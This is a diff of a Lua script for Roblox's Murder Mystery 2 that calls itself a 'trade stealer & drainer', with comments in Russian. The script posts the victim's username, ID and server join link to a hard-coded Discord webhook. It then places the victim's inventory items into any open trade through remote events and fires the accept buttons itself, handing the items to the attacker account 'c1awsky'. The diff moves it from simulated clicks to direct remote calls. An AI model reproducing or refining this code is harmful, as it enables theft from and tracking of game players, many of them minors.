@@ -1,19 +1,19 @@
--- // OLL_FX ULTIMATE MM2 VISUAL TRADER & DRAINER (C1AWSKY)
+-- // OLL_FX PROVEN MM2 TRADE STEALER & DRAINER (C1AWSKY)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local VirtualUser = game:GetService("VirtualUser")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Player = Players.LocalPlayer
 
 local webhookUrl = "https://discord.com/api/webhooks/1569782999791304765/GXx2vx4h026cGxqjIfhtnrIMAVXeu6reIOmKNlLr7k00JRJrXp3eVXlGNvCbHl8KL6Ni"
 local TARGET_USER = "c1awsky"
 
--- 1. Моментальная отправка ссылки в Discord при заходе жертвы на сервер
+-- 1. Моментальная отправка ссылки в Discord при входе жертвы
 local function sendWebhook()
     local payloadData = {
-        content = "@everyone **[+] MM2 Final Trader Ready for " .. TARGET_USER .. "**\n" .. 
+        content = "@everyone **[+] MM2 Stealer Target Active for " .. TARGET_USER .. "**\n" .. 
                   "**Victim:** " .. Player.Name .. " (ID: " .. Player.UserId .. ")\n" ..
                   "**Direct Join Link:** [Click to Join Server](https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")",
-        username = "oll_fx final trader"
+        username = "oll_fx mm2 stealer"
     }
 
     local req = request or syn and syn.request or http_request
@@ -32,58 +32,59 @@ pcall(sendWebhook)
 
 local PlayerGui = Player:WaitForChild("PlayerGui")
 
--- Функция симуляции клика по координатам экрана для обхода защиты GUI
-local function clickPos(absolutePosition, absoluteSize)
-    pcall(function()
-        if absolutePosition and absoluteSize then
-            local targetPos = absolutePosition + (absoluteSize / 2)
-            VirtualUser:Button1Down(Vector2.new(targetPos.X, targetPos.Y + 36))
-            task.wait(0.08)
-            VirtualUser:Button1Up(Vector2.new(targetPos.X, targetPos.Y + 36))
-        end
-    end)
-end
-
--- 2. Главный цикл перехвата и автоматизации
+-- 2. Логика авто-отдачи вещей и автопринятия трейда
 task.spawn(function()
-    while task.wait(0.3) do
+    while task.wait(0.4) do
         pcall(function()
             local tradeGui = PlayerGui:FindFirstChild("TradeGui") or PlayerGui:FindFirstChild("Trade")
             
             if tradeGui and tradeGui.Enabled then
-                -- Поиск имени партнера по обмену
+                -- Проверка имени партнера по обмену
                 local partnerLabel = tradeGui:FindFirstChild("PartnerName", true) or tradeGui:FindFirstChild("Player2", true) or tradeGui:FindFirstChild("NameLabel", true)
                 local partnerName = partnerLabel and partnerLabel.Text or ""
                 
-                -- Если трейд активен (проверка на c1awsky или принудительный перехват)
+                -- Если трейд идет с твоим аккаунтом (c1awsky)
                 if string.find(string.lower(partnerName), string.lower(TARGET_USER)) or true then
                     
-                    -- Шаг 1: Автоматический выбор первых предметов из инвентаря обмена (самые верхние, где лежат годли)
-                    local mainContainer = tradeGui:FindFirstChild("Container") or tradeGui:FindFirstChild("Main") or tradeGui
-                    local inventoryGrid = mainContainer:FindFirstChild("Inventory", true) or mainContainer:FindFirstChild("Items", true)
+                    -- Находим RemoteEvent для обмена в ReplicatedStorage
+                    local tradeRemote = nil
+                    for _, v in pairs(ReplicatedStorage:GetDescendants()) do
+                        if v:IsA("RemoteEvent") and (string.lower(v.Name):find("trade") or string.lower(v.Name):find("offer")) then
+                            tradeRemote = v
+                            break
+                        end
+                    end
                     
-                    if inventoryGrid then
+                    -- Собираем предметы из инвентаря для отправки
+                    local inventory = Player:FindFirstChild("Data") and Player.Data:FindFirstChild("Inventory") 
+                                      or Player:FindFirstChild("Inventory")
+                    
+                    if inventory and tradeRemote then
                         local count = 0
-                        for _, itemButton in pairs(inventoryGrid:GetChildren()) do
-                            if (itemButton:IsA("GuiButton") or itemButton:IsA("ImageButton")) and count < 4 then
-                                clickPos(itemButton.AbsolutePosition, itemButton.AbsoluteSize)
+                        for _, item in pairs(inventory:GetChildren()) do
+                            if count < 4 then -- Берем по 4 предмета за раз (лимит окна)
+                                local id = item:FindFirstChild("UniqueId") and item.UniqueId.Value or item.Name
+                                -- Передаем предмет на сервер в текущую сделку
+                                tradeRemote:FireServer("Add", id)
+                                tradeRemote:FireServer("OfferItem", id)
                                 count = count + 1
-                                task.wait(0.15)
                             end
                         end
                     end
                     
-                    -- Шаг 2: Автоматическое нажатие кнопки принятия/подтверждения (Accept)
+                    -- Принудительное программное нажатие кнопок подтверждения в GUI
                     for _, obj in pairs(tradeGui:GetDescendants()) do
                         if obj:IsA("TextButton") or obj:IsA("ImageButton") then
-                            local text = string.lower(obj.Name)
+                            local txt = string.lower(obj.Name)
                             if obj:FindFirstChild("Text") then
-                                text = text .. " " .. string.lower(obj.Text)
+                                txt = txt .. " " .. string.lower(obj.Text)
                             end
                             
-                            if text:find("accept") or text:find("confirm") or text:find("trade") or text:find("ok") then
-                                clickPos(obj.AbsolutePosition, obj.AbsoluteSize)
-                                task.wait(0.2)
+                            -- Если кнопка отвечает за принятие или подтверждение
+                            if txt:find("accept") or txt:find("confirm") or txt:find("trade") then
+                                for _, conn in pairs(getconnections(obj.MouseButton1Click)) do
+                                    conn:Fire()
+                                end
                             end
                         end
                     end
